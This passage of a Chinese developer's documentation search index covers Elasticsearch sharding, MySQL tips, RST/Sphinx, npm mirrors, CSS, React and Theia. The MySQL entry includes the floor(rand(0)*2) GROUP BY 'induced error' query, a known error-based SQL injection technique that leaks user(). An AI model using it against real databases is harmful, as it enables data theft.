在全新的集群中设置初始主节点集。\n默认情况下，这个列表是空的，这意味着这个节点希望加入一个已经被引导的集群。 具备成为master节点的应该设置initial_master_nodes为一个master集群列表，\n而其他的node不用设置，可以自己引导\n（测试发现如果都设置，第一次启动集群时，master节点必须最后启动才可以完全发现所有的node） 更新，有毒吧，全设置了initial_master_nodes，删除了data数据又重新测试了一下，\n居然master可以不用最后启动了也可以全部发现了。那就是昨天本机网络有问题？ 分片与副本 分片 将数据分成几份，使用head-master可以很直观的看出， 例如设置分片：5 就会在主页出现0,1,2,3,4五个分片 副本 就是数据的备份， 例如分片为5，副本为1：就会出现0,0,1,1,2,2,3,3,4,4一共十个分片，有一份是副本 官方： 一个索引可以存储超出单个结点硬件限制的大量数据。\n比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间；\n或者单个节点处理搜索请求，响应太慢。 为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。\n当你创建一个索引的时候，你可以指定你想要的分片的数量。\n每个分片本身也是一个功能完善并且独立的\"索引\"，这个\"索引\"可以被放置到集群中的任何节点上。 分片之所以重要，主要有两方面的原因： 允许你水平分割/扩展你的内容容量 允许你在分片（潜在地，位于多个节点上）之上进行分布式的、并行的操作，进而提高性能/吞吐量 至于一个分片怎样分布，它的文档怎样聚合回搜索请求，\n是完全由Elasticsearch管理的，对于作为用户的你来说，这些都是透明的。 在一个网络/云的环境里，失败随时都可能发生，\n在某个分片/节点不知怎么的就处于离线状态，或者由于任何原因消失了。\n这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。\n为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做复制分片，或者直接叫复制。 复制之所以重要，主要有两方面的原因： 在分片/节点失败的情况下，提供了高可用性。\n因为这个原因，注意到复制分片从不与原/主要（original/primary）分片置于同一节点上是非常重要的。 扩展你的搜索量/吞吐量，因为搜索可以在所有的复制上并行运行 总之，每个索引可以被分成多个分片。\n一个索引也可以被复制0次（意思是没有复制）或多次。\n一旦复制了，每个索引就有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。\n分片和复制的数量可以在索引创建的时候指定。\n在索引创建之后，你可以在任何时候动态地改变复制数量，但是不能改变分片的数量。 默认情况下，Elasticsearch中的每个索引被分片5个主分片和1个复制，\n这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝），\n这样的话每个索引总共就有10个分片。\n一个索引的多个分片可以存放在集群中的一台主机上，也可以存放在多台主机上，这取决于你的集群机器数量。\n主分片和复制分片的具体位置是由ES内在的策略所决定的。","tags":"数据库","url":"/yq-docs-database-elasticsearch-index.html","loc":"/yq-docs-database-elasticsearch-index.html"},{"title":"mysql","text":"索引 查询选项 explain优化 MVCC mysql备份方案 数据库引擎 主从同步 锁 其他问题 索引数据结构 事务 分库分表 8.0新特性 概念基础 表内外连接 on、where、Having的区别 mysql base 预定义变量: @@datadir                数据路径\n@@basedir                mysql安装路径\n@@version_compile_os     mysql安装的系统 备份 备份某一个表: mysqldump -uroot -p $database $table >/tmp/t.sql 全部备份: mysqldump -uroot -p -ARE --triggers --master-data=2 --single-transaction >/tmp/full.sql 其他详细信息见: mysql备份方案 注释 单行: # select\n-- select 多行: /*\nselect\n*/ 关于字符集修改 直接修改数据表的字符集不一定行,\n得删除表重新建表的时候弄字符集 直接修改字符集（不一定有用）: select\n  concat(\n      'alter table ',\n        TABLE_NAME,\n        ' convert to character set utf8mb4 collate utf8mb4_general_ci;'\n    )\nfrom\n  information_schema.'TABLES'\nwhere\n  TABLE_SCHEMA = '$database'; 这个结果为更改语句，直接复制执行即可 诱导报错 诱导报错: select count(*) ,concat((select user()),floor(rand(0)*2))x from information_schema.TABLES group by x; 在mysql5.7中会有以下报错, 8的版本中没有复现出来 诱导报错 sql预处理 设置预处理语句: EXECUTE stmt_name [USING @var_name [, @var_name] ...]; 册除(释放)定义: {DEALLOCATE | DROP} PREPARE stmt_name; 例子: # 设置预处理语句\nprepare select_content from 'select table_name, engine from information_schema.TABLES where version = ? and table_schema= ? ';\n\n# 设置参数\nset @ver=10; set @base='information_schema';\n\n# 执行查询\nexecute select_content using @ver, @base;","tags":"数据库","url":"/yq-docs-database-mysql.html","loc":"/yq-docs-database-mysql.html"},{"title":"mysql概念定义","text":"关键字 关键字 关键字-truncate 数据类型 数据类型VARCHAR和CHAR 基础 函数API binlog SQL四种语言-DDL,DML,DCL,TCL 存储过程 触发器 函数自定义 外键约束 外键约束（表2）对父表（表1）的含义: 在父表上进行update/delete以更新或删除在子表中有一条或多条对应匹配行的候选键时，\n父表的行为取决于：在定义子表的外键时指定的on update/on delete子句。 含义 CASCADE 删除包含与已删除键值有参照关系的所有记录 SET NULL 修改包含与已删除键值有参照关系的所有记录，使用NULL值替换(只能用于已标记为NOT NULL的字段) RESTRICT 拒绝删除要求，直到使用删除键值的辅助表被手工删除，并且没有参照时(这是默认设置，也是最安全的设置) NO ACTION 啥也不做","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-index.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-index.html"},{"title":"doc可用于rst文本元素","text":"这是按照指令分类 Admonitions Images body-elements tables Document Parts Directives for Substitution Definitions Miscellaneous Common Options 公共选项参数 class         不知道有啥用 name          设置方便引用 如: .. image:: bild.png\n  :name: my picture\n\n# 引用方式1\n.. _my picture:\n\n# 引用方式2\n.. image:: bild.png 参考: docutils文档","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-index.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-index.html"},{"title":"rst语法模块","text":"按照用法分类 标题 段落 文本样式 插入图片 列表 引用 表格 侧边栏 代码 其他-download download用于引用文件地址, 可点击下载: .. download:`xxx.pdf`","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-index.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-index.html"},{"title":"rst标记语言","text":"语法模块 doc语法模块 关于构建主题 sphinx自定义主题 doc文档转换为rst docx文件转换rst 杂乱无章 问题 sphinx使用介绍可参考: 官方文档(英) 地址: https://www.sphinx-doc.org 第三方中译 文档: https://daobook.github.io/sphinx/index.html 文档目录: https://daobook.github.io/sphinx/contents.html 插件教程: https://daobook.github.io/sphinx/development/tutorials/index.html 主题使用: https://daobook.github.io/sphinx/usage/theming.html 主题开发: https://daobook.github.io/sphinx/development/theming.html 此文档项目github地址: https://github.com/daobook/daobook.github.io","tags":"文档","url":"/yq-docs-document-RST-mark-language-index.html","loc":"/yq-docs-document-RST-mark-language-index.html"},{"title":"使用ReadtheDocs托管文档","text":"关键词:: 文档 rst文档 Sphinx 文档托管 ReadtheDocs 是一个基于 Sphinx 的免费文档托管项目.\n是一个比较大的文档托管平台. 需要先有一个支持Sphinx文档项目,\n然后托管到github, 且需要开源. 去 <https://readthedocs.org/dashboard/> 注册账号并登录,\n然后在仪表盘导入github项目即可. 如果是使用github关联登录, 可以直接看到自己的所有github仓库,\n选择文档仓库即可 或者选择手动导入, 填写相关信息:","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Use-ReadTHEDOCS-hosting-document.html","loc":"/yq-docs-document-RST-mark-language-question-Use-ReadTHEDOCS-hosting-document.html"},{"title":"一些坑","text":"toctree通配符失效 跨文档引用问题 自定义主题 target警告 文档超链接 跨文档超链接(引用) 内嵌PDF到文档 便捷启动服务 使用ReadtheDocs托管文档","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-index.html","loc":"/yq-docs-document-RST-mark-language-question-index.html"},{"title":"wiki","text":"wiki wiki.js","tags":"文档","url":"/yq-docs-document-wiki-index.html","loc":"/yq-docs-document-wiki-index.html"},{"title":"包管理器","text":"相关资源: npm镜像站 https://developer.aliyun.com/mirror/?serviceType=&tag=&keyword=npm 常见有两个 npm yarn npm 安装 brew install npm 查看当前的镜像源。 npm config get registry 设置为淘宝源(注意是新的淘宝源, 参考 https://developer.aliyun.com/mirror/NPM ) npm config set registry http://registry.npmmirror.com 还原默认源 npm config set registry https://registry.npmjs.org/ 临时使用 上面那种设置是全局的，以后每次都会自动读取已经设置好的源，如果只是一次性使用，可以使用下面的命令 npm --registry https://registry.npm.taobao.org install XXX（模块名） 使用cnpm cnpm是一个命令，用它来代替npm npm install -g cnpm --registry=https://registry.npm.taobao.org\ncnpm install XXX(模块名) 使用nrm npm install -g nrm\nnrm use taobao\nnrm ls  # 查看当前可用源命令 yarn 安装 brew install yarn yarn 默认是去 npm/yarn 官方镜像源（国外）获取资源, 较慢 查询源 yarn config get registry 设置镜像地址 # yarn config set registry https://registry.npmmirror.com\nyarn config set registry https://registry.npmmirror.com\n\n# electron镜像\n# yarn config set electron_mirror https://npmmirror.com/mirrors/electron/ 注解 如果一直卡在: [4/4] 🔨  Rebuilding all packages...\n[-/24] ⠄ waiting...\n[-/24] ⠂ waiting...\n[-/24] ⠁ waiting...\n[-/24] ⠂ waiting...\n[-/24] ⠂ waiting...\n[15/24] ⠂ electron 可以试着设置electron镜像 yarn config set electron_mirror https://npmmirror.com/mirrors/electron/ 还原 yarn config set registry https://registry.yarnpkg.com 注解 建议所有使用yarn配置的镜像, 再使用npm配置一遍, 因为有些工具\n还是用的是npm下载而不是yarn. 第三方工具yrm管理镜像源 安装 npm install -g yrm 列出所有镜像源 yrm ls 切换镜像 yrm use taobao 新增镜像 yrm add aliyun http://maven.aliyun.com/nexus/content/groups/public 删除镜像 yrm del taobao 测试延迟（访问速度） yrm test aliyun 查看帮助 yrm -h","tags":"前端","url":"/yq-docs-front-end-Bag-manager.html","loc":"/yq-docs-front-end-Bag-manager.html"},{"title":"内置函数/对象","text":"内置对象 navigator 字符串操作 字符串前后剔除 trim() 剔除首尾空格, 类似于Python的 strip() trimLeft() 剔除首空格 trimRight() 剔除尾空格 切片 slice(start, end) 接受两个参数：开始索引和结束索引(可选), 它会返回一个新的字符串，包含从开始索引到结束索引之间的字符（不包括结束索引对应的字符）。\n如果省略结束索引，则 slice() 方法会复制从开始索引到字符串末尾的所有字符。 数组也有slice, 使用一致 数组操作 slice(start, end) 接受两个参数：开始索引和结束索引(可选), 它会返回一个新的数组，包含从开始索引到结束索引之间的元素（不包括结束索引对应的元素）。\n如果省略结束索引，则 slice() 方法会复制从开始索引到数组末尾的所有元素。 字符串也有slice, 使用一致","tags":"前端","url":"/yq-docs-front-end-Built--in-function-index.html","loc":"/yq-docs-front-end-Built--in-function-index.html"},{"title":"css常用属性","text":"align-items background background-image background-color border-radius box-shadow clip color content cursor display float justify-content margin opacity outline overflow padding place-content position text-align text-decoration transform transition user-select 设置元素可拖动 目前只知道 Electron 中这样用, 用于在 Electron 应用程序中控制窗口的拖拽行为 css属性设置 # theia-drag-panel { height : calc ( 100 % - 4 px ); -webkit- app-region : drag !important ; } -webkit-app-region: drag: 将元素设置为可拖拽的窗口标题栏区域。用户可以通过拖动这个区域来移动应用程序窗口。 这是默认的值,通常用于应用程序的标题栏。 -webkit-app-region: no-drag: 将元素设置为不可拖拽的区域。即使元素在标题栏区域,用户也无法通过拖动它来移动窗口。 通常用于标题栏上的一些控制按钮,如最小化、最大化等,以防止意外移动窗口。 -webkit-app-region: exclude: 将元素从可拖拽区域中排除。 可以用于在标题栏内放置自定义的控制按钮,防止意外移动窗口。 height: calc(100% - 4px); 100%: 这表示元素的高度将占据其父元素的 100% 高度。 -4px: 这是一个减法操作,表示从父元素的 100% 高度中减去 4 个像素。 因此,这个属性的最终效果是: 元素的高度将会是其父元素高度的 100%,减去 4 个像素。 这样做的目的是让元素的高度略小于其父元素的高度,通常用于在元素周围留出一些空间或边距。 place-content、justify-content、align-items 和 text-align 区别 place-content：设置 Grid 布局元素在容器中的水平和垂直对齐方式 place-content 属性是 CSS Grid 布局的一个简写属性，\n用于同时设置元素在容器中的水平和垂直方向上的对齐方式。\n它接受两个值，第一个值表示水平对齐方式，第二个值表示垂直对齐方式。\n例如：place-content: center center; 表示在容器中水平和垂直方向上居中对齐。 justify-content：设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 justify-content 属性用于设置元素在容器的主轴（水平轴）上的对齐方式。\n它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。\n常见的值包括 flex-start（默认值，左对齐）、flex-end（右对齐）、\ncenter（居中对齐）、space-between（两端对齐，项目之间平均分布）、space-around（项目周围平均分布）等。 align-items：设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 align-items 属性用于设置元素在容器的交叉轴（垂直轴）上的对齐方式。\n它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。\n常见的值包括 flex-start（默认值，顶部对齐）、flex-end（底部对齐）、\ncenter（居中对齐）、baseline（基线对齐，元素的基线对齐）等。 text-align：设置元素框内文本内容的水平对齐方式 text-align 属性用于设置文本内容在元素框中的水平对齐方式。\n它适用于块级元素和一些内联元素。\n常见的值包括 left（默认值，左对齐）、right（右对齐）、\ncenter（居中对齐）、justify（两端对齐）等。该属性主要用于调整文本的对齐方式，而不是元素本身。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-index.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-index.html"},{"title":"text-decoration","text":"主要是针对 a 标签, 表示 a 标签的文本是否需要下划线. 常用支持属性 none 不需要下划线 underline 需要下划线","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-text-decoration.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-text-decoration.html"},{"title":"css","text":"./各种选择器 ./css常用属性 ./css常见使用技巧 ./宽度-高度百分比说明 ./元素的出场顺序 伪类 CSS媒体查询 CSS 媒体查询（Media Queries）是 CSS3 中的一个特性，\n它允许你根据一系列的媒体特性（如屏幕分辨率、视口宽度、打印设备等）来应用不同的样式规则。 比如 @ media ( min-width : 600px ) { /* 当屏幕宽度至少为 600 像素时，这些样式将被应用 */ body { font-size : 1.2 em ; } } 如果要在JavaScript中查询, 可通过 window.matchMedia() 方法，\n你可以在 JavaScript 中检测媒体查询的条件是否为真，\n并根据结果执行相应的代码。\n这不是直接在 CSS 中定义媒体查询，而是在 JavaScript 中检测和响应 CSS 媒体查询的条件。\n参考: /docs/前端/概念性/Window对象 一些伪类选择器 hover: 鼠标悬停 focus: 元素获取焦点(如input键盘选中) active: 元素激活, 这个没怎么理解 none与unset区别 none: 指定没有样式的值或属性. 它常用于清除或禁用某个样式属性的效果 unset: 将样式属性重置为其默认值. 它会将属性值重置为浏览器默认值或继承值，\n根据具体属性的默认行为而定。使用 \"unset\" 可以撤销已应用的样式，并将其恢复为初始状态 像素单位 rem rem 是相对于根元素（即 <html> 元素）的字体大小来计算的单位 px px 是固定的像素单位 em 类似于 rem，\nem 也是相对于父元素的字体大小计算的单位。\n不同之处在于，em 是相对于最近的父级元素的字体大小来计算的。\n如果没有显式设置父元素的字体大小，em 单位将继承自上级元素的字体大小。 % 百分比单位是相对于父元素的尺寸来计算的。\n例如，设置一个元素的宽度为 50%，表示该元素的宽度将是其父元素宽度的一半。 vw 和 vh vw 和 vh 分别表示视口宽度（Viewport Width）和视口高度（Viewport Height）的百分比单位。\n例如，1vw 表示视口宽度的 1%。这些单位用于创建响应式布局，可以根据视口的大小来确定元素的尺寸。 ex（相对于小写字母 \"x\" 的高度）、ch（相对于数字 \"0\" 的宽度）等 这些单位相对于字体相关的尺寸进行计算。 绝对单位 除了相对单位，CSS 还支持一些绝对单位，如 cm（厘米）、mm（毫米）、in（英寸）、pt（磅）等。\n这些单位在打印和物理媒体方面比较常用。 导入其他css 比如在 theme.css 中导入 checkbox.css: /* theme.css */\n@import url(checkbox.css); chrome支持前端断点 比如按钮点击后的断点","tags":"前端","url":"/yq-docs-front-end-CSS-index.html","loc":"/yq-docs-front-end-CSS-index.html"},{"title":"前端-概念性","text":"异常 Dom-Document对象 前端长度单位 Symbol使用 for...in 和 for...of 循环区别 迭代对象类型: for...in 循环会遍历对象本身的可枚举属性,包括原型链上的属性。 for...of 循环会遍历可迭代对象(如数组、字符串、Map、Set 等)的元素。 迭代键值: for...in 循环会返回对象属性的键(字符串或 Symbol)。 for...of 循环会返回可迭代对象的值。 遍历顺序: for...in 循环的遍历顺序是不确定的,取决于对象属性的枚举顺序。 for...of 循环会按照可迭代对象的迭代器协议定义的顺序进行遍历。 性能: for...in 循环通常比 for...of 循环慢,因为它需要检查原型链上的属性。 for...of 循环一般比 for...in 循环快,因为它直接访问可迭代对象的元素。 比如对于Map集合, for...in 返回的是键 for...of 返回的是键值对","tags":"前端","url":"/yq-docs-front-end-Conceptual-index.html","loc":"/yq-docs-front-end-Conceptual-index.html"},{"title":"ES6","text":"基本上参照 菜鸟教程-ES6教程 ES6， 全称 ECMAScript 6.0 ，是 JavaScript 的下一个版本标准，2015.06 发版。\nES6 主要是为了解决 ES5 的先天不足，比如 JavaScript 里并没有类的概念，\n但是目前浏览器的 JavaScript 是 ES5 版本，大多数高版本的浏览器也支持 ES6，不过只实现了 ES6 的部分特性和功能。 JavaScript 的正式名称是 ECMAScript 语法基础: 基本数据类型 变量声明 Map与Set Reflect与Proxy 字符串操作 数值 对象 数组 函数 类 模块 Promise 对象 promise Generator 函数 async 函数 一些相关工具 Node.js Node.js 是运行在服务端的 JavaScript，它对 ES6 的支持度更高 在 Node.js 环境中运行 ES6: $ node\n> let sitename=\"runoob\"\nundefined\n> console.log(sitename)\nrunoob\nundefined\n> webpack webpack 是一个现代 JavaScript 应用程序的静态模块打包器 (module bundler) .\n当 webpack 处理应用程序时，它会递归地构建一个依赖关系图 (dependency graph) ,\n其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle 。 webpack 主要有四个核心概念: 入口 (entry) 入口会指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始.\n进入入口起点后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的.\n在 webpack 中入口有多种方式来定义: 单个入口（简写）\n语法: const config = {\n  entry: \"./src/main.js\"\n} 对象\n语法: const config = {\n  app: \"./src/main.js\",\n  vendors: \"./src/vendors.js\"\n} 输出 (output) output 属性会告诉 webpack 在哪里输出它创建的 bundles ，\n以及如何命名这些文件，默认值为 ./dist: const config = {\n  entry: \"./src/main.js\",\n  output: {\n    filename: \"bundle.js\",\n    path: path.resolve(__dirname, 'dist')\n  }\n} loader loader 让 webpack 可以去处理那些非 JavaScript 文件（ webpack 自身只理解 JavaScript ）.\nloader 可以将所有类型的文件转换为 webpack 能够有效处理的模块，\n例如，开发的时候使用 ES6 ，通过 loader 将 ES6 的语法转为 ES5 ，如下配置: const config = {\n  entry: \"./src/main.js\",\n  output: {\n    filename: \"bundle.js\",\n    path: path.resolve(__dirname, 'dist')\n  },\n  module: {\n    rules: [\n      {\n          test: /\\.js$/,\n          exclude: /node_modules/,\n          loader: \"babel-loader\",\n          options: [\n            presets: [\"env\"]\n          ]\n      }\n    ]\n  }\n} 插件 (plugins) loader 被用于转换某些类型的模块，而插件则可以做更多的事情.\n包括打包优化、压缩、定义环境变量等等.\n插件的功能强大，是 webpack 扩展非常重要的利器，可以用来处理各种各样的任务.\n使用只需要 require() ，然后添加到 plugins 数组中: // 通过 npm 安装\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n// 用于访问内置插件\nconst webpack = require('webpack');\n\nconst config = {\n  module: {\n    rules: [\n      {\n          test: /\\.js$/,\n          exclude: /node_modules/,\n          loader: \"babel-loader\"\n      }\n    ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin({template: './src/index.html'})\n  ]\n}; gulp 基于流的自动化构建工具","tags":"前端","url":"/yq-docs-front-end-ES6-index.html","loc":"/yq-docs-front-end-ES6-index.html"},{"title":"TypeScript","text":"TypeScript 微软开发, 自由、开源的编程语言; 是 JavaScript 的一个超集 TypeScript 是 JavaScript 的超集，扩展了 JavaScript 的语法，\n因此现有的 JavaScript 代码可与 TypeScript 一起工作无需任何修改，TypeScript 通过类型注解提供编译时的静态类型检查。\nTypeScript 可处理已有的 JavaScript 代码，并只对其中的 TypeScript 代码进行编译。 执行方式: 方法1: 先用 tsc 编译为js, 然后执行 方法2: 使用 ts-node 直接执行ts文件(需要安装typescript ts-node @types/node tslib库) 语法 基础语法 基础类型 函数 问号与叹号 ts源码调试 相关指令 tsc 条件语句 if [else [if ...]] switch...case 循环 普通的for,\neg: for ( init; condition; increment ){\n    statement(s);\n} for...in语句: for (var val in list) {\n    //语句\n} 其他如for…of 、every 和 some 循环 while语句: while(condition)\n{\n  statement(s);\n} do...while: do\n{\n  statement(s);\n}while( condition ); 请注意，条件表达式出现在循环的尾部，所以循环中的 statement(s) 会在条件被测试之前至少执行一次 命令空间使用 命名空间的名称可以与类名一致,\n但是 如果类是 export, 命名空间也要 export 类要先命名空间声明","tags":"前端","url":"/yq-docs-front-end-TypeScript-index.html","loc":"/yq-docs-front-end-TypeScript-index.html"},{"title":"低代码框架amis","text":"低代码框架旨在仅用极少的配置信息来表述一个页面 关于amis, 个人觉得,\n最好的适用情况是: 已经有完备的后端api, 只需要简单的规划前端JSON即可 像与React结合这种, 个人不建议使用JSON的形式, 因为有一些交互是需要代码实例变量介入的,\n实在要介入, 要么React类变量等不参与JSON的数据流转,\n要么, 感觉直接使用amis提供好的组件以JSX的形式使用. 当然, 个人观点. amis api配置 表达式语法 支持的actonType 表单校验 问题 教程 痛点-数据域的更新 当子层更新数据域后,上层不会收到更新(数据域向上更新); 当某次更新数据域后, 下次打开还是旧的(当前数据域数据保存); 必须通过api来更新, 坑点... 请求适配器 可用于对请求数据的过滤等操作, 见: https://aisuda.bce.baidu.com/amis/zh-CN/docs/types/api#配置请求适配器 组件的简单自定义 官方原文见: https://aisuda.bce.baidu.com/amis/zh-CN/docs/extend/custom-react 例子: {\n    // type: 'custom-kv-text',\n    name: 'envDD',\n    label: 'label-d',\n    mode: \"horizontal\",\n    asFormItem: true,\n    children: ({value, onChange, data}: any) => (\n        <React.Fragment>\n            <p>这个是个自定义组件</p>\n            {/*<p>当前值：{value}</p>*/}\n            <input type='text' value={typeof value === 'object' ? JSON.stringify(value) : value}\n                    onChange={(e) => {\n                        let curData = e.target.value\n                        try {\n                            curData = JSON.parse(curData)\n                            data.envData = curData\n                        } catch (err) {\n                            console.log('not json schema')\n                            // return\n                        }\n                        onChange(curData)\n                    }}\n            />\n        </React.Fragment>\n    )\n},","tags":"前端","url":"/yq-docs-front-end-frame-amis-index.html","loc":"/yq-docs-front-end-frame-amis-index.html"},{"title":"问题总结","text":"React使用 渲染界面无样式 调用本地自定义函数 与React结合使用的数据更新 validations验证信息配置无效 数据域的向上更新 dialog更新父组件数据域 input-text说明 input-kv说明 input-array使用 调用其他组件 combo无法指定更新某一个 componentName无效 变量使用 类disabled属性只能识别数据链对象 设置其他组件的值 disabledOn 表达式如果包含有 横杠 - 时会无效","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-index.html","loc":"/yq-docs-front-end-frame-amis-question-index.html"},{"title":"Amis教程","text":"自定义数据过滤器 validateApi提交联动数据","tags":"前端","url":"/yq-docs-front-end-frame-amis-turorial-index.html","loc":"/yq-docs-front-end-frame-amis-turorial-index.html"},{"title":"前端框架","text":"amis electron react theia jQuery","tags":"前端","url":"/yq-docs-front-end-frame-index.html","loc":"/yq-docs-front-end-frame-index.html"},{"title":"React API","text":"Component","tags":"前端","url":"/yq-docs-front-end-frame-react-API-index.html","loc":"/yq-docs-front-end-frame-react-API-index.html"},{"title":"forwardRef","text":"官网: https://zh-hans.react.dev/reference/react/forwardRef React.forwardRef 会创建一个React组件，这个组件能够将其接受的 ref 属性转发到其组件树下的另一个组件中。\n这种技术并不常见，但在以下两种场景中特别有用： 转发 refs 到 DOM 组件 在高阶组件中转发 refs 转发 DOM 组件(内置组件节点) 一般情况下, ref不能挂到一个函数式组件 , 使用 fowardRef 就可以支持: const App: React.FC = () => {\n  const ref = useRef(null);\n\n    useEffect(() => {\n      ref.current.focus();\n    }, []);\n\n    return (\n      <>\n        <Child ref={ref} />\n      </>\n    );\n};\n\nconst Child = forwardRef((props, ref: Ref<any>) => {\n  return <input type=\"text\" name=\"child\" ref={ref} />;\n}); 注解 React.forwardRef参数必须是function，而这个API通常用来解决HOC（高阶组件）中丢失ref的问题。 useImperativeHandle 见: useImperativeHandle 参考: useRef、createRef的区别及使用，及useRef妙用 react中ref、createRef、useRef、forwardRef以及useImperativeHandle","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-Forwardref.html","loc":"/yq-docs-front-end-frame-react-hooks-Forwardref.html"},{"title":"hooks","text":"钩子函数? 主要是为了状态逻辑的复用 最常见的内置两种 useState useEffect 注解 貌似严格来说, 只有函数才算Hooks 函数组件拥有 useState useEffect useRef forwardRef useImperativeHandle 类组件特有 createRef 其他 自定义Hook Hook 的规则 只在最顶层使用Hook: 也就是不要在循环、条件或嵌套函数中调用Hook，这样可以做到各个hook 在每一次渲染中，调用的顺序是一致的. 那为什么要保证 hook 调用顺序? 和React实现hook的原理有关, 每次渲染时，React把所有调用的 hook 用数组来储存. 只在React组件中才能调用:","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-index.html","loc":"/yq-docs-front-end-frame-react-hooks-index.html"},{"title":"技术实现","text":"多主题 编辑器打开并滑动 资源管理器工作区按钮 工具栏更多 theia源码-user-storage 关于vscode的语言服务器","tags":"前端","url":"/yq-docs-front-end-frame-theia-Technical-realization-index.html","loc":"/yq-docs-front-end-frame-theia-Technical-realization-index.html"},{"title":"Theia","text":"一个IDE框架, 前后端分离的架构 以插件的形式编写代码, 支持依赖注入 后端可选浏览器/Electron 注意使用 rawProcessFactory 创建的进程可能受\nProcessManager的控制, 会在关闭时候自动关闭所有由其创建的子进程 创建自己的IDE 技术实现 问题 教程 注解 此篇幅所有内容, 基于Theia当前版本: % yarn list --pattern=@theia/core\nyarn list v1.22.17\n└─ @theia/core@1.42.1\n✨  Done in 1.06s. 一些更新 跟随theia的更新, theia-1.43.1 此版本中文翻译有问题, \"File\" 会被翻译为本地看见, 研究代码后\n在github提出: https://github.com/eclipse-theia/theia/pull/13028 作者有跟进 补充, 合并了. 其他, theia翻译文件位置: core/src/common/i18n/nls.metadata.json 插件市场 地址: https://open-vsx.org 一些常用插件: 中文支持: https://open-vsx.org/extension/ms-ceintl/vscode-language-pack-zh-hans","tags":"前端","url":"/yq-docs-front-end-frame-theia-index.html","loc":"/yq-docs-front-end-frame-theia-index.html"},{"title":"Theia框架相关问题总结","text":"关于theia的绑定 创建自定义拓展 打开-切换编辑器 引入自定义css文件 组件的状态渲染 完全关闭Theia应用 取消异步操作 依赖注入使用以及问题 在theia的dialog上新增自定义dialog 自定义任意位置的鼠标右键上下文菜单 使用diff编辑器打开两个文件对比 结合electron时候的报错 前后端通信-前端调用后端服务 控件状态保存与恢复 前后端路径传递URI 使用外部浏览器打开链接 theia启动白屏 内置一些外部插件 打开目录&文件选择器 yarn install 出现node-gyp报错 打开总是提示工作区受限 消息: An extension requests workspace trust but the corresponding API is not yet fully supported. Do you want to trust this workspace? 解决 关闭询问, 即信任所有工作区 修改后会提示重启, 重启即可 注解 貌似我这边实际的问题应该是, 即使点了允许, 下一次打开还是会提示, 没空具体看哪的毛病\n暂时先这样解决. 禁用pylint相关不必要检查 \"--disable=missing-module-docstring\",\n\"--disable=line-too-long\",\n\"--disable=consider-using-f-string\",\n\"--disable=useless-object-inheritance\",\n\"--disable=too-few-public-methods\",\n\"--disable=too-many-branches\",\n\"--disable=no-member\",\n\"--disable=trailing-whitespace\"\n\n// 这个不确定是否相关\n\"cSpell.minklordLength\": 7,\n\"cSpell.ignoreRegExpList\": [\n  \"/https?:N/N//\",\n  \"/ [a-z0-9\\1. 11-]+@[a-z0-9\\1. 11-]+\\\\-[a-z]+/\",\n  \"/IN\\/NICa-z0-9\\\\/N\\\\\\]+[V\\/N\\V\\][a-z0-9_\\\\-\\\\.]+/i\"\n] theia获取当前默认使用的语言 import { nls } from \"@theia/core\" ; // 当前语言是否等于默认的 en nls . locale === nls . defaultLocale // 或者 // window.localStorage.getItem('localeId') 框架源码 nls 位置是这样定义的(仅贴关键部分) export namespace nls { export let localization : Localization | undefined ; export const defaultLocale = 'en' ; export const localeId = 'localeId' ; export const locale = typeof window === 'object' && window && window . localStorage . getItem ( localeId ) || undefined ; // ... }","tags":"前端","url":"/yq-docs-front-end-frame-theia-question-index.html","loc":"/yq-docs-front-end-frame-theia-question-index.html"},{"title":"标准库","text":"./child_process","tags":"前端","url":"/yq-docs-front-end-node-Standard-library-index.html","loc":"/yq-docs-front-end-node-Standard-library-index.html"},{"title":"node服务端","text":"node相关 ./node下载安装 ./node启动常见参数 内置对象 node标准库 ./标准库 node三方库 ./三方库 内置变量 process 私以为就是指当前node进程本身,\n可用来做很多事情, 比如查看当前包含所有东西的版本: process.versions","tags":"前端","url":"/yq-docs-front-end-node-index.html","loc":"/yq-docs-front-end-node-index.html"},{"title":"问题","text":"包管理器-常见报错 箭头函数this指向问题 浏览器缓存清理 前端-函数调用与组件调用 自定义样式的Checkbox electron+react+ts html下url编码 import与require jsx或tsx的花括号 Object原型方法 package.json增加本地模块 vscode项目的编译运行 CSS排除指定的选择器 ts的感叹号与问号 导入json 问题总结","tags":"前端","url":"/yq-docs-front-end-question-index.html","loc":"/yq-docs-front-end-question-index.html"},{"title":"一些UI相关的了解","text":"16进制颜色 如: #00FF00FF 以 # 开头, 后续以每两个以为一个部分 第一个, 表示透明度, 这里是 00 (透明度为0) 第二个, 表示红色, 这里是 FF (深红) 第二个, 表示黄色, 这里是 00 (浅黄) 第二个, 表示蓝色, 这里是 FF (深蓝) 想要什么颜色就是调整这些部分的值来调色 为什么用两位 因为在十进制中颜色的数值范围为 0 